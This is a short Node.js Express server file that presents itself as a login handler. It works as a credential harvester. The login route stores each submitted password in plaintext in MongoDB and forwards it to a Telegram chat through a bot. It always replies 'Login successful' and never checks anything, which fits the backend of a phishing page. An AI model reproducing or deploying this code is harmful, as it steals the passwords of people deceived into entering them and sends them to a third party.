require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const axios = require('axios');

// Initialize the express app
const app = express();

// CORS Configuration
const corsOptions = {
  origin: 'http://127.0.0.1:5500',  // Allow requests from this origin
  methods: ['GET', 'POST'],  // Allowed HTTP methods
  allowedHeaders: ['Content-Type', 'Authorization'],  // Allowed headers
};

app.use(cors(corsOptions));  // Enable CORS
app.use(express.json());  // Parse JSON requests

// MongoDB connection
mongoose.connect(process.env.MONGO_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
}).then(() => console.log("MongoDB Connected"))
  .catch(err => console.error("Error connecting to MongoDB:", err));

// Define the schema and model for login data
const loginSchema = new mongoose.Schema({
  formId: String,
  password: String,
  loginTime: { type: Date, default: Date.now }
});

const Login = mongoose.model('Login', loginSchema);

// Function to send login data to Telegram bot
const sendToTelegram = (formId, password) => {
  const chatId = process.env.TELEGRAM_CHAT_ID;  // Ensure this is in your .env file
  const message = `Form ID ${formId} logged in with password: ${password}`;

  axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
    chat_id: chatId,
    text: message
  })
  .then(response => console.log("Data sent to Telegram:", response.data))
  .catch(error => console.error("Error sending data to Telegram:", error));
};

// Auth route - to handle login, save data to DB, and send it to Telegram
app.post('/api/auth/login', async (req, res) => {
  const { formId, password } = req.body;

  console.log("Received login data:", { formId, password });

  try {
    const newLogin = new Login({ formId, password });
    await newLogin.save();  // Save to database
    sendToTelegram(formId, password);  // Send to Telegram bot
    res.json({ message: 'Login successful', status: 'success' });
  } catch (error) {
    console.error('Error saving login data:', error);
    res.status(500).json({ message: 'Error saving login data', status: 'error' });
  }
});

// Start the server
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
